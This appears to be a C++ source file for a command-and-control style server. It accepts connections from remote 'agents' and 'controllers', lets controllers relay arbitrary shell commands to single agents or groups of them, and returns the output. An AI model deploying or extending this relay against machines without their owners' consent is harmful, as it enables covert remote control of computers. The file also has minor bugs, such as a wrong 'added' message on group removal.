#include "Server.hpp"

Server::~Server() {
    std::cout << "destructor!\n";
    for (AgentConnection* conn : arrAgentConnections) {
        delete conn;
    }
}


INT Server::StartServer() {
    WSADATA wsaData;
    SOCKET arrListeningSockets[2];
    std::thread arrThreads[2];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    CreateListeningSocket(3000, arrListeningSockets[0]);
    CreateListeningSocket(3001, arrListeningSockets[1]);

    bIsRunning = TRUE;
    arrThreads[0] = std::thread(&Server::ListenForConnections, this, 3000, arrListeningSockets[0]);
    arrThreads[1] = std::thread(&Server::ListenForConnections, this ,3001, arrListeningSockets[1]);

    std::cout << "[+] Listening for clients on port 3000\n";
    std::cout << "[+] Listening for agents on port 3001\n";

    arrThreads[0].join();
    arrThreads[1].join();
    WSACleanup();

    return 0;
}


BOOL Server::CreateListeningSocket(INT iPort, SOCKET& outSocket) {

    outSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (outSocket == INVALID_SOCKET)
        return FALSE;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(iPort);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(outSocket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR ||
        listen(outSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        closesocket(outSocket);
        outSocket = INVALID_SOCKET;
        return FALSE;
    }

    return TRUE;
}


BOOL Server::ListenForConnections(INT iPort, SOCKET listeningSocket)
{
    INT nSocketReadResult;
    INT iFdSetIndex = (iPort == AGENT_PORT) ? 1 : 0;

    InitMasterSet(iFdSetIndex);
    AddSocketToMaster(listeningSocket, iFdSetIndex);

    while (bIsRunning) {
        SetReadSetAsMaster(iFdSetIndex);
        nSocketReadResult = WaitForSocketRead(iFdSetIndex);

        if (nSocketReadResult == SOCKET_ERROR) {
            std::cerr << "select() failed\n";
            break;
        }

        // Check for new connections:
        AcceptNewConnections(listeningSocket, iFdSetIndex);

        // Check for closed connections or new data:
        if (iPort == AGENT_PORT) {
            CheckForClosedAgentConnections();
        }
        else {
            CheckForControllerConnections();
        }
    }

    return TRUE;
}

VOID Server::AcceptNewConnections(SOCKET listeningSocket, INT iFdSetIndex)
{
    INT nAddrLen;
    sockaddr_in clientAddr;
    nAddrLen = sizeof(clientAddr);

    if (IsSocketInSet(listeningSocket, iFdSetIndex)) {
        SOCKET clientSocket = accept(listeningSocket, (sockaddr*)&clientAddr, &nAddrLen);

        if (clientSocket != INVALID_SOCKET) {
            if (iFdSetIndex == AGENT_INDEX)
            {
                AddAgentConnection(clientSocket);
            }
            else {
                AddControllerConnection(clientSocket);
            }
        }
    }
}


VOID Server::CheckForClosedAgentConnections()
{
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
        AgentConnection* conn = *connectionsIterator;

        if (IsSocketInSet(conn->GetSocket(), AGENT_INDEX)) {
            std::string szData;
            BOOL bIsConnectionAlive;
            bIsConnectionAlive = conn->ReceiveData(szData);

            if (!bIsConnectionAlive) {
                std::cout << "[-] Disconnected from " << conn->GetSocketStr() << "\n";
                connectionsIterator = RemoveAgentConnection(connectionsIterator);
            }
            else {
                if (!szData.empty()) {
                    conn->EnqueueIncomingData(szData);
                }

                ++connectionsIterator;
            }
        }
        else {
            ++connectionsIterator;
        }
    }
}


VOID Server::CheckForControllerConnections()
{
    std::lock_guard<std::mutex> lock(mControllerConnectionsMutex);

    for (auto connectionsIterator = arrControllerConnections.begin(); connectionsIterator != arrControllerConnections.end();) {
        ControllerConnection* conn = *connectionsIterator;

        if (IsSocketInSet(conn->GetSocket(), CONTROLLER_INDEX)) {
            std::string szData;
            BOOL bIsConnectionAlive;
            bIsConnectionAlive = conn->ReceiveData(szData);

            if (!bIsConnectionAlive) {
                std::cout << "[-] Disconnected from " << conn->GetSocketStr() << "\n";
                connectionsIterator = RemoveControllerConnection(connectionsIterator);
            }
            else {
                if (!szData.empty()) {
                    std::cout << "[*] Received data:" << szData << " from " << conn->GetSocketStr() << " controller\n";
                    HandleControllerCommand(szData, conn);
                }

                ++connectionsIterator;
            }
        }
        else {
            ++connectionsIterator;
        }
    }
}


VOID Server::AddAgentConnection(SOCKET socket) {
    //std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
    AgentConnection* agentConn = new AgentConnection(socket);
    arrAgentConnections.push_back(agentConn);
    AddSocketToMaster(socket, AGENT_INDEX);
    std::cout << "[+] Connected to " << agentConn->GetSocketStr() << " agent\n";
}

VOID Server::AddControllerConnection(SOCKET socket) {
    //std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
    ControllerConnection* controllerCon = new ControllerConnection(socket);
    arrControllerConnections.push_back(controllerCon);
    AddSocketToMaster(socket, CONTROLLER_INDEX);
    std::cout << "[+] Connected to " << controllerCon->GetSocketStr() << " controller\n";
}

std::vector<AgentConnection*>::iterator Server::RemoveAgentConnection(std::vector<AgentConnection*>::iterator& connectionIterator) {
    RemoveConnectionFromAllGroups(*connectionIterator);
    RemoveSocketFromSet((*connectionIterator)->GetSocket(), AGENT_INDEX);
    delete *connectionIterator;
    auto iterator = arrAgentConnections.erase(connectionIterator);

    return iterator;
}


std::vector<ControllerConnection*>::iterator Server::RemoveControllerConnection(std::vector<ControllerConnection*>::iterator& connectionIterator) {
    RemoveSocketFromSet((*connectionIterator)->GetSocket(), CONTROLLER_INDEX);
    delete* connectionIterator;
    auto iterator = arrControllerConnections.erase(connectionIterator);

    return iterator;
}

VOID Server::HandleControllerCommand(std::string szData, ControllerConnection* conn)
{
    BOOL bIsCommandSuccess;
    std::string szResponse;
    const nlohmann::json jsonData = nlohmann::json::parse(szData);
    ControllerCommandReq controllerCommand = jsonData;
    // TODO: change to switch case
    switch (controllerCommand.GetCommandType()) {
    case CommandType::Quit:
        bIsRunning = FALSE;
        szResponse = "[*] Successfully killed server process\n";
        break;

    case CommandType::Close:
        bIsCommandSuccess = CloseConnection(controllerCommand.GetTargetAgent());

        if (bIsCommandSuccess) {
            szResponse = "[*] Successfully closed connection with " + conn->GetSocketStr() + "\n";
        }
        else {
            szResponse = "[!] Error closing connection with " + conn->GetSocketStr() + "\n";
        }
        break;

    case CommandType::List:
        szResponse = GetActiveAgentSockets();
        break;

    case CommandType::GroupAdd: {
        AgentConnection* agentConn;
        auto connectionIterator = FindConnectionFromSocketStr(controllerCommand.GetTargetAgent());

        if (connectionIterator != arrAgentConnections.end()) {
            agentConn = *connectionIterator;
            groupManager.AddConnectionToGroup(controllerCommand.GetGroupName(), agentConn);
            szResponse = "[*] Successfully added " + controllerCommand.GetTargetAgent() + " to " +
                controllerCommand.GetGroupName() + " group\n";
        }
        else {
            szResponse = "[!] Agent " + controllerCommand.GetTargetAgent() + " does not exist\n";
        }
        break;
    }

    case CommandType::GroupCreate:
        bIsCommandSuccess = groupManager.CreateGroup(controllerCommand.GetGroupName());

        if (!bIsCommandSuccess) {
            szResponse = "[!] Group " + controllerCommand.GetGroupName() + " already exists\n";
        }
        else {
            szResponse = "[*] Successfully created group " + controllerCommand.GetGroupName() + "\n";
        }
        break;

    case CommandType::GroupDelete:
        bIsCommandSuccess = groupManager.DeleteGroup(controllerCommand.GetGroupName());

        if (!bIsCommandSuccess) {
            szResponse = "[!] Group " + controllerCommand.GetGroupName() + " doesn't exist\n";
        }
        else {
            szResponse = "[*] Successfully deleted group " + controllerCommand.GetGroupName() + "\n";
        }
        break;

    case CommandType::GroupRemove: {
        AgentConnection* agentConn;
        auto connectionIterator = FindConnectionFromSocketStr(controllerCommand.GetTargetAgent());

        if (connectionIterator != arrAgentConnections.end()) {
            agentConn = *connectionIterator;
            bIsCommandSuccess = groupManager.RemoveConnectionFromGroup(controllerCommand.GetGroupName(), agentConn);

            if (bIsCommandSuccess) {
                szResponse = "[*] Successfully added " + controllerCommand.GetTargetAgent() + " to " +
                    controllerCommand.GetGroupName() + " group\n";
            }
            else {
                szResponse = "[!] Group " + controllerCommand.GetGroupName() + " doesn't exist\n";
            }
        }
        else {
            szResponse = "[!] Agent " + controllerCommand.GetTargetAgent() + " does not exist\n";
        }
        break;
    }

    case CommandType::ListGroup:
        bIsCommandSuccess = groupManager.ListGroupMembers(controllerCommand.GetGroupName(), szResponse);
        break;

    case CommandType::ListGroupNames:
        groupManager.GetGroupNames(szResponse);
        break;

    case CommandType::OpenCmdWindow:
        if (groupManager.CheckGroupExists(controllerCommand.GetGroupName()) ||
            FindConnectionFromSocketStr(controllerCommand.GetTargetAgent()) != arrAgentConnections.end())
        {
            szResponse = "Found";
        }
        else {
            szResponse = "Not found";
        }
        break;

    case CommandType::Execute: {
        auto connectionIterator = FindConnectionFromSocketStr(controllerCommand.GetTargetAgent());

        if (connectionIterator != arrAgentConnections.end()) {
            (*connectionIterator)->SendData(controllerCommand.GetParameters());
            (*connectionIterator)->GetDataFromQueue(szResponse, -1);
        }
        else {
            szResponse = "Connection Lost";
        }
        break;
    }

    case CommandType::GroupExecute: {
        BOOL bIsGroupExists = groupManager.CheckGroupExists(controllerCommand.GetGroupName());

        if (bIsGroupExists) {
            groupManager.BroadcastToGroup(controllerCommand.GetGroupName(), controllerCommand.GetParameters(), szResponse);
        }
        else {
            szResponse = "[!] Group " + controllerCommand.GetGroupName() + " doesn't exist\n";
        }
        break;
    }

    default:
        szResponse = "[!] Server error occurred\n";
        break;
    }

    conn->SendData(szResponse);
}


std::string Server::GetActiveAgentSockets() {
    std::string szResult;

    if (arrAgentConnections.size() == 0) {
        szResult = "[+] No active sockets\n";
    }
    else {
        szResult = "[+] Active sockets:\n";

        for (AgentConnection* conn : arrAgentConnections) {
            szResult += "[+] Connected to " + conn->GetSocketStr() + "\n";
        }
    }

    return szResult;
}




std::vector<AgentConnection*>::iterator Server::FindConnectionFromSocketStr(std::string szSocket) {
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
        AgentConnection* conn = *connectionsIterator;

        if (conn->GetSocketStr() == szSocket) {
            return connectionsIterator;
        }

        ++connectionsIterator;
    }

    std::cout << "Could not find connection " << szSocket << "\n";
    return arrAgentConnections.end();
}

VOID Server::RemoveConnectionFromAllGroups(AgentConnection* conn)
{
    auto arrGroups = conn->GetGroups();
    for (auto group : arrGroups) {
        groupManager.RemoveConnectionFromGroup(group, conn);
    }
}


//VOID Server::HandleUserInput() {
//    while (bIsRunning) {
//        std::string input;
//        std::cout << "Enter Full command: ";
//        std::getline(std::cin, input);
//
//        std::istringstream iss(input);
//        std::string command;
//        iss >> command;
//
//        std::vector<std::string> parameters;
//        std::string param;
//
//        while (iss >> param) {
//            parameters.push_back(param);
//        }
//
//        for (const auto& p : parameters) {
//            std::cout << "- " << p << "\n";
//        }
//
//        if (command == "quit") {
//            bIsRunning = FALSE;
//        }
//        else if (command == "close") {
//            if (parameters.size() != 1) {
//                std::cout << "[!] Invalid parametrs for close command\n";
//            }
//            else {
//                CloseConnection(parameters[0]);
//            }
//        }
//        else if (command == "cmd") {
//            UserRunCommand(parameters);
//        }
//        else if (command == "list") {
//            std::cout << GetActiveAgentSockets();
//        }
//        else if (command == "group-cmd") {
//            if (parameters.size() > 1) {
//                UserRunCommandOnGroup(parameters);
//            }
//            else {
//                std::cout << "[!] Invalid parametrs for group-create command\n";
//            }
//        }
//        else if (command == "group-create") {
//            if (parameters.size() == 1) {
//                groupManager.CreateGroup(parameters[0]);
//            }
//            else {
//                std::cout << "[!] Invalid parametrs for group-create command\n";
//            }
//        }
//        else if (command == "group-add") {
//            if (parameters.size() == 2) {
//                std::vector<AgentConnection*>::iterator connectionIterator = FindConnectionFromSocketStr(parameters[1]);
//
//                if (connectionIterator != arrAgentConnections.end()) {
//                    AgentConnection* conn = *connectionIterator;
//                    groupManager.AddConnectionToGroup(parameters[0], conn);
//                }
//                else {
//                    std::cout << "[!] error!";
//                }
//
//            }
//            else {
//                std::cout << "[!] Invalid parametrs for group-add command\n";
//            }
//        }
//        else if (command == "group-list") {
//            std::string szOutput;
//
//            if (parameters.size() == 1) {
//                groupManager.ListGroupMembers(parameters[0], szOutput);
//                std::cout << szOutput;
//            }
//            else {
//                std::cout << "[!] Invalid parametrs for group-list command\n";
//            }
//        }
//        else if (command == "group-delete") {
//            if (parameters.size() == 1) {
//                groupManager.DeleteGroup(parameters[0]);
//            }
//            else {
//                std::cout << "[!] Invalid parametrs for group-delete command\n";
//            }
//        }
//        else if (command == "man") {
//            UserShowMan();
//        }
//        else if (command != "") {
//            std::cout << "[!] Unrecogzied command\n";
//            UserShowMan();
//        }
//    }
//
//}


BOOL Server::CloseConnection(std::string szSocket) {
    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
    std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);

    if (connectionsIterator != arrAgentConnections.end()) {
        RemoveAgentConnection(connectionsIterator);
        return TRUE;
    }

    return FALSE;
}


//VOID Server::UserRunCommand(const std::vector<std::string>& arrParameters) {
//    std::string szCommand;
//    std::string szSocket;
//
//    if (arrParameters.size() < 2) {
//        std::cout << "Not enough parameters provided.\n";
//        return;
//    }
//
//    for (size_t i = 0; i < arrParameters.size() - 1; ++i) {
//        szCommand += arrParameters[i];
//        if (i < arrParameters.size() - 2)
//            szCommand += " ";
//    }
//
//    szSocket = arrParameters.back();
//
//    //std::cout << "Combined parameters: " << szCommand << "\n";
//    //std::cout << "Last parameter: " << szSocket << "\n";
//
//    auto connectionsIterator = FindConnectionFromSocketStr(szSocket);
//    //CHANGE
//    //std::lock_guard<std::mutex> lock(mAgentConnectionsMutex);
//
//    if (connectionsIterator != arrAgentConnections.end()) {
//        std::string szData;
//        (*connectionsIterator)->SendData(szCommand);
//        (*connectionsIterator)->ReceiveData(szData);
//        std::cout << "[*] received from " << (*connectionsIterator)->GetSocketStr() << " : \n" << szData << "\n";
//    }
//
//}

//VOID Server::UserRunCommandOnGroup(const std::vector<std::string>& arrParameters)
//{
//    std::string szGroupName = arrParameters[0];
//    std::string szCommand;
//
//
//    for (size_t i = 1; i < arrParameters.size(); ++i) {
//        szCommand += arrParameters[i];
//        if (i < arrParameters.size() - 1) {
//            szCommand += " ";
//        }
//    }
//
//    //groupManager.BroadcastToGroup(szGroupName, szCommand);
//    
//}


//VOID Server::UserShowMan() {
//    std::cout << "[*] quit - Kill server and all connections\n";
//    std::cout << "[*] close IP:PORT - Close connection with IP:PORT\n";
//    std::cout << "[*] cmd COMMAND IP:PORT - Execute COMMAND on IP:PORT\n";
//    std::cout << "[*] list - Show all active connections\n";
//    std::cout << "[*] group-create - Create a new control group\n";
//    std::cout << "[*] group-delete GROUPNAME - Delete GROUPNAME control group\n";
//    std::cout << "[*] group-add GROUPNAME IP:PORT - Add IP:PORT to GROUPNAME control group\n";
//    std::cout << "[*] group-remove GROUPNAME IP:PORT - Remove IP:PORT from GROUPNAME control group\n";
//    std::cout << "[*] group-list GROUPNAME - Print the members of GROUPNAME control group\n";
//    std::cout << "[*] group-cmd GROUPNAME COMMAND - Execute COMMAND on members of GROUPNAME control group\n";
//    std::cout << "[*] groups - Print all active control groups\n";
//    std::cout << "[*] man - Show this man page\n";
//}


fd_set Server::GetMasterSet(INT iFdSetIndex) {
    return masterSet[iFdSetIndex];
}

fd_set Server::GetReadSet(INT iFdSetIndex) {
    return readSet[iFdSetIndex];
}
VOID Server::InitMasterSet(INT iFdSetIndex) {
    FD_ZERO(&masterSet[iFdSetIndex]);
}


VOID Server::SetReadSetAsMaster(INT iFdSetIndex) {
    readSet[iFdSetIndex] = masterSet[iFdSetIndex];
}


VOID Server::AddSocketToMaster(SOCKET socket, INT iFdSetIndex) {
    FD_SET(socket, &masterSet[iFdSetIndex]);
}


INT Server::WaitForSocketRead(INT iFdSetIndex) {
    timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    return select(0, &readSet[iFdSetIndex], NULL, NULL, &timeout);
}


BOOL Server::IsSocketInSet(SOCKET socket, INT iFdSetIndex) {
    return FD_ISSET(socket, &readSet[iFdSetIndex]);
}


VOID Server::RemoveSocketFromSet(SOCKET socket, INT iFdSetIndex) {
    FD_CLR(socket, &masterSet[iFdSetIndex]);
}
